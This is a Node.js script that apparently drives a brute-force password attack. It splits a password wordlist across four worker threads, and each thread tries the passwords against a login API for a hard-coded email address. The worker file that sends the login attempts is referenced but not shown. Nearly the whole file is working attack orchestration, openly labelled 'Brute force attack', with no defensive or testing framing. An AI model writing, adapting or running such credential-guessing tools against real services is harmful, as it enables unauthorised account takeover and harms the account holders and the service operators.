import fs from 'fs'
import chalk from 'chalk'
import 'dotenv/config'
import { Worker } from 'worker_threads'
const API_URL = process.env.API_URL
const email = 'sami@gmail.com'

const numThreads = 4;

function startWorker(data){
    return new Promise((resolve,reject)=>{
        const worker = new Worker('./with-thread/bruteAttack.js',{
            workerData:data
        })
        worker.on('message',resolve)
        worker.on('error',reject)
        worker.on('exit',(code)=>{
            if(code !==0 ){
                reject(new Error('worker stopped'))
            }
        })
    })
}

async function main() {
    const passwords = fs.readFileSync('./password.txt','utf-8').split('\n').map(password=> password.trim())
    const chunkSize = Math.ceil(passwords.length / numThreads);
    const passwordChunks = [];
  
    for (let i = 0; i < passwords.length; i += chunkSize) {
      passwordChunks.push(passwords.slice(i, i + chunkSize));
    }
    const t1 = Date.now()
    // return promise for every chunks
    const workerPromises = passwordChunks.map(chunk => startWorker({
      API_URL,
      email,
      passwords: chunk,
      t1
    }));
    
    try {
        // Execute all promises
      await Promise.all(workerPromises);
      console.log('Brute force attack completed.');
    } catch (err) {
      console.error('Error in brute force attack:', err);
    }
  }
  main();